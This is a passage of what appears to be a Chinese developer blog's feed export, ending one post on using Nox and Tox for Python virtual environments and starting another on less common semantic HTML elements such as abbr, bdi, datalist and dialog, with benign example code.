src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7653602e147c43ccab1438a4589f7dfb~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=932&h=287&s=90851&e=png&b=fffefe" alt="20231102192818"></p><p><code>Nox</code> 是一个命令行工具，用于在多个 Python 环境中进行自动测试，开发者可以使用标准的 Python 文件对项目进行配置。</p><p>我们可以在项目根目录下创建一个 <code>noxfile.py</code> 文件，使用安装好的 <code>nox</code> 模块运行这个文件，以创建 python 虚拟环境并运行一些预定的指令。我们也可以手动激活 python 虚拟环境，就像前面的 venv 一样。</p><h3 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h3><p>新建个 <code>app</code> 目录，在里面配置一份 <code>noxfile.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nox <span class="comment"># 引用 nox 模块</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@nox.session(<span class="params">python=<span class="string">&#x27;3.8.12&#x27;</span></span>) </span><span class="comment"># 使用 python3.8.12</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">install_flask</span>(<span class="params">session</span>): <span class="comment"># 创建一个名为 install_flask 的会话</span></span><br><span class="line">    session.install(<span class="string">&#x27;flask&#x27;</span>) <span class="comment"># 安装 flask 依赖</span></span><br></pre></td></tr></table></figure><p>然后，我们在当前目录下执行以下指令，初始化这个虚拟环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m nox   </span><br><span class="line"></span><br><span class="line">nox &gt; Running session install_flask</span><br><span class="line">nox &gt; Creating virtual environment (virtualenv) using python3.8 <span class="keyword">in</span> .nox/install_flask</span><br><span class="line">nox &gt; python -m pip install flask</span><br><span class="line">nox &gt; Session install_flask was successful.</span><br></pre></td></tr></table></figure><p>初始化完成后，当前目录下多出 <code>__pycache__</code> 和 <code>.nox</code> 文件，前者是缓存目录，存储编译后的 python 代码，后者就是我们的虚拟环境目录，类似与使用 `python -m venv env`` 创建的 env 目录。</p><p>有了虚拟环境之后，常用的指令就和 venv 没有太大差别了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 激活 install_flask 虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> .nox/install_flask/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出虚拟环境</span></span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure><p>你可以把下面这段 <code>app.py</code> 写入当前目录下，作用是实现一个 flask Web 服务，你可以激活刚创建好的这个虚拟环境，然后尝试运行这个服务。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>如果运行结果与下图类似，即 flask web 服务正常运行，则代表你的 nox 与刚创建的虚拟环境没有问题。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2fc32ac6fac94f3188fe1648edb07a62~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=881&h=211&s=31011&e=png&b=15172a" alt="20231102194422"></p><blockquote><p>nox 只能创建当前系统已有 python 解释器对应版本的虚拟环境，也就是说你本地没有 python2.7.10 环境，你也无法创建 2.7.10 虚拟环境。</p></blockquote><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p>可以从以下渠道继续学习 nox，它的功能远比我这个案例中所演示的强大得多。</p><ul><li>官方文档：<a href="https://nox.thea.codes/en/stable/index.html">Welcome to Nox</a></li><li>中文文档：<a href="https://daobook.github.io/nox/index.html">欢迎来到 Nox</a></li><li>项目地址：<a href="https://github.com/wntrblm/nox">Winterbloom&#x2F;nox</a></li></ul><h2 id="另一选择-Tox"><a href="#另一选择-Tox" class="headerlink" title="另一选择 - Tox"></a>另一选择 - Tox</h2><p><code>Nox</code> 与 <code>Tox</code> 十分相似，二者都是 python 任务自动化工具，都可以创建虚拟环境以隔绝项目与本地系统。</p><ul><li>官方文档：<a href="https://www.osgeo.cn/tox/">欢迎来到tox自动化项目</a></li><li>GitHub 仓库：<a href="https://github.com/tox-dev/tox">tox-dev&#x2F;tox</a></li></ul><h2 id="终极解决方案-x"><a href="#终极解决方案-x" class="headerlink" title="终极解决方案(x)"></a>终极解决方案(x)</h2><p>在群里问 python 环境管理的时候，学长提供了一个终极解决方案：</p><blockquote><p><em><strong>“遇到 py2 的代码，就先帮他 migrate 到 py3 再跑。”</strong></em></p></blockquote><p>听到这句话的阿菇：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9290643581454d859553ae708dd893fb~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=213&h=218&s=10453&e=jpg" alt="20231102200942"></p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML的少见标签及&lt;head&gt;优化</title>
      <link href="/2023/10/24/2023/html-relearn/"/>
      <url>/2023/10/24/2023/html-relearn/</url>
      
        <content type="html"><![CDATA[<p>阿菇最近倾向于用原生三件套做 Web 开发，想尽可能少地依赖三方库。</p><p>或许没什么必要，因为封装好的东西用起来确实爽快。但造轮子确实也有造轮子的快乐。不可辩解的是，阿菇对前端项目中乱糟糟的配置文件以及 <code>node_modules</code> 感到厌烦，即使在开发过程中用了 <code>File Nesting Updater</code> 这样简化目录结构的插件。</p><p>掌握一定 Web 开发基础后再回过头来学习，能发现之前没注意到的有趣知识，可以再做记录。</p><p>以下内容有很多代码片段，光说没意思，自己 copy 后修修改改看看效果！<br>可以在这个在线平台实验：<a href="https://c.runoob.com/front-end/61/">HTML&#x2F;CSS&#x2F;JS 在线工具</a></p><h2 id="HTML-元素"><a href="#HTML-元素" class="headerlink" title="HTML 元素"></a>HTML 元素</h2><p>Web 前端开发者经常使用语义化元素：既能提高 HTML 的可读性，也能减少写 CSS 命名的烦恼，还有利于 SEO 优化，好处多多。</p><p>当然也可以 <code>&lt;div&gt;</code> 一把嗦，方便的很（类比后端编写 API 时 <code>POST</code> 一把嗦）。<br>很多老网站都是这么做的，比如我们做网站备案时用的 <a href="https://www.beian.gov.cn/">互联网网站安全管理服务平台</a>，清一色的 <code>&lt;div&gt;</code> 标签。</p><p>除了常用的 <code>&lt;header&gt;</code>、<code>&lt;main&gt;</code> 等规划网页布局的元素，<code>&lt;em&gt;</code>、<code>&lt;br&gt;</code> 等用于规划文本布局的元素，还有一些有趣的语义化标签。<br>我觉得以后能用上，也打算去用，这里就做个记录。</p><h3 id=""><a href="#" class="headerlink" title="&lt;abbr&gt;"></a><code>&lt;abbr&gt;</code></h3><p>文本缩写元素，同时提供了一个 <code>title</code> 属性值，可以实现鼠标 hover 时显示具体内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">&quot;HyperText Markup Language&quot;</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span> is fun!</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="-1"><a href="#-1" class="headerlink" title="&lt;address&gt;"></a><code>&lt;address&gt;</code></h3><p>提供个人或组织的联系方式，仅表达了额外的语义信息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:jim@rock.com&quot;</span>&gt;</span>jim@rock.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tel:+13115552368&quot;</span>&gt;</span>(311) 555-2368<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="-2"><a href="#-2" class="headerlink" title="&lt;bdi&gt;"></a><code>&lt;bdi&gt;</code></h3><p>双向文本隔离元素，<code>dir</code> 属性不继承父元素，即被该元素包裹的内容方向不受父元素的影响，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">dir</span>=<span class="string">&quot;rtl&quot;</span>&gt;</span></span><br><span class="line">  This arabic word <span class="tag">&lt;<span class="name">bdi</span>&gt;</span>ARABIC_PLACEHOLDER<span class="tag">&lt;/<span class="name">bdi</span>&gt;</span> is automatically displayed</span><br><span class="line">  right-to-left.</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="-3"><a href="#-3" class="headerlink" title="&lt;bdo&gt;"></a><code>&lt;bdo&gt;</code></h3><p>双向文本替代元素，可以改写文本的方向，而不需要编写 CSS 样式。</p><p>自带的 <code>dir</code> 属性有两个可选值：</p><ul><li><code>ltr</code> - 左到右</li><li><code>rtl</code> - 右到左</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bdo</span> <span class="attr">dir</span>=<span class="string">&quot;rtl&quot;</span>&gt;</span>This text will go right to left.<span class="tag">&lt;/<span class="name">bdo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="-4"><a href="#-4" class="headerlink" title="&lt;caption&gt;"></a><code>&lt;caption&gt;</code></h3><p>HTML 表格标题元素，常作为 <code>&lt;table&gt;</code> 的第一个子元素出现。</p><p>仅支持全局属性，要改变样式需要用 CSS 的 <code>caption-side</code> 或者 <code>text-align</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">caption</span>&gt;</span></span><br><span class="line">    表格名称和值</span><br><span class="line">  <span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">scope</span>=<span class="string">&quot;col&quot;</span>&gt;</span>名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">scope</span>=<span class="string">&quot;col&quot;</span>&gt;</span>HEX<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">scope</span>=<span class="string">&quot;col&quot;</span>&gt;</span>HSLa<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">scope</span>=<span class="string">&quot;col&quot;</span>&gt;</span>RGBa<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">scope</span>=<span class="string">&quot;row&quot;</span>&gt;</span>Teal<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>#51F6F6<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>hsla(180, 90%, 64%, 1)<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>rgba(81, 246, 246, 1)<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">scope</span>=<span class="string">&quot;row&quot;</span>&gt;</span>Goldenrod<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>#F6BC57<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>hsla(38, 90%, 65%, 1)<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>rgba(246, 188, 87, 1)<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="-5"><a href="#-5" class="headerlink" title="&lt;cite&gt;"></a><code>&lt;cite&gt;</code></h3><p>HTML 引用元素，表示一个作品的引用，且必须包含作品的标题。</p><p>与之类似的有 <code>&lt;blackquote&gt;</code> 和 <code>&lt;q&gt;</code> 元素的 <code>cite</code> 属性，值一般为引用链接。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">blockquote</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>It was a bright cold day in April, and the clocks were striking thirteen.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">figcaption</span>&gt;</span></span><br><span class="line">    First sentence in <span class="tag">&lt;<span class="name">cite</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.george-orwell.org/1984/0.html&quot;</span>&gt;</span>Nineteen Eighty-Four<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">cite</span>&gt;</span> by George</span><br><span class="line">    Orwell (Part 1, Chapter 1).</span><br><span class="line">  <span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="-6"><a href="#-6" class="headerlink" title="&lt;data&gt;"></a><code>&lt;data&gt;</code></h3><p>将一个指定内容和机器可读的翻译联系在一起。但是，如果内容是与时间或者日期相关的，则一定要使用 <code>&lt;time&gt;</code>。</p><p><code>value</code> 属性为标签内容所对应的数据。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">data</span> <span class="attr">value</span>=<span class="string">&quot;398&quot;</span>&gt;</span>迷你番茄酱<span class="tag">&lt;/<span class="name">data</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">data</span> <span class="attr">value</span>=<span class="string">&quot;399&quot;</span>&gt;</span>巨无霸番茄酱<span class="tag">&lt;/<span class="name">data</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">data</span> <span class="attr">value</span>=<span class="string">&quot;400&quot;</span>&gt;</span>超级巨无霸番茄酱<span class="tag">&lt;/<span class="name">data</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="-7"><a href="#-7" class="headerlink" title="&lt;datalist&gt;"></a><code>&lt;datalist&gt;</code></h3><p>类似输入框，但使用 <code>&lt;option&gt;</code> 提供了一些默认可选项。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">datalist</span> <span class="attr">id</span>=<span class="string">&quot;ice-cream-flavors&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Chocolate&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Coconut&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Mint&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Strawberry&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Vanilla&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">datalist</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="-8"><a href="#-8" class="headerlink" title="&lt;dfn&gt;"></a><code>&lt;dfn&gt;</code></h3><p>HTML 定义元素，一般结合前文的 <code>&lt;addr&gt;</code> 使用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dfn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">&quot;World-Wide Web&quot;</span>&gt;</span>WWW<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dfn</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="-9"><a href="#-9" class="headerlink" title="&lt;dialog&gt;"></a><code>&lt;dialog&gt;</code></h3><p>对话框元素，一般用于实现一个独立的交互式组件。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Simple modal dialog containing a form --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dialog</span> <span class="attr">id</span>=<span class="string">&quot;favDialog&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;dialog&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span></span></span><br><span class="line"><span class="tag">        &gt;</span>Favorite animal:</span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;default&quot;</span>&gt;</span>Choose…<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">option</span>&gt;</span>Brine shrimp<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">option</span>&gt;</span>Red panda<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">option</span>&gt;</span>Spider monkey<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">value</span>=<span class="string">&quot;cancel&quot;</span>&gt;</span>Cancel<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;confirmBtn&quot;</span> <span class="attr">value</span>=<span class="string">&quot;default&quot;</span>&gt;</span>Confirm<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dialog</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;updateDetails&quot;</span>&gt;</span>Update details<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">output</span>&gt;</span><span class="tag">&lt;/<span class="name">output</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对应的 <code>JavaScript</code> 代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> updateButton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;updateDetails&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> favDialog = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;favDialog&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> outputBox = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;output&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> selectEl = favDialog.<span class="title function_">querySelector</span>(<span class="string">&quot;select&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> confirmBtn = favDialog.<span class="title function_">querySelector</span>(<span class="string">&quot;#confirmBtn&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If a browser doesn&#x27;t support the dialog, then hide the</span></span><br><span class="line"><span class="comment">// dialog contents by default.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> favDialog.<span class="property">showModal</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">  favDialog.<span class="property">hidden</span> = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">/* a fallback script to allow this dialog/form to function</span></span><br><span class="line"><span class="comment">     for legacy browsers that do not support &lt;dialog&gt;</span></span><br><span class="line"><span class="comment">     could be provided here.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &quot;Update details&quot; button opens the &lt;dialog&gt; modally</span></span><br><span class="line">updateButton.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> favDialog.<span class="property">showModal</span> === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    favDialog.<span class="title function_">showModal</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    outputBox.<span class="property">value</span> =</span><br><span class="line">      <span class="string">&quot;Sorry, the &lt;dialog&gt; API is not supported by this browser.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// &quot;Favorite animal&quot; input sets the value of the submit button</span></span><br><span class="line">selectEl.<span class="title function_">addEventListener</span>(<span class="string">&quot;change&quot;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  confirmBtn.<span class="property">value</span> = selectEl.<span class="property">value</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// &quot;Confirm&quot; button of form triggers &quot;close&quot; on dialog because of [method=&quot;dialog&quot;]</span></span><br><span class="line">favDialog.<span class="title function_">addEventListener</span>(<span class="string">&quot;close&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  outputBox.<span class="property">value</span> = <span class="string">`<span class="subst">$&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">    favDialog.returnValue</span></span></span><br><span class="line"><span class="subst"><span class="string">  &#125;</span> button clicked - <span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toString()&#125;</span>`</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用该元素时应当注意搭配 <code>autofocus</code> 属性，为用户在弹出的对话框中自动选择一个合适的焦点。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 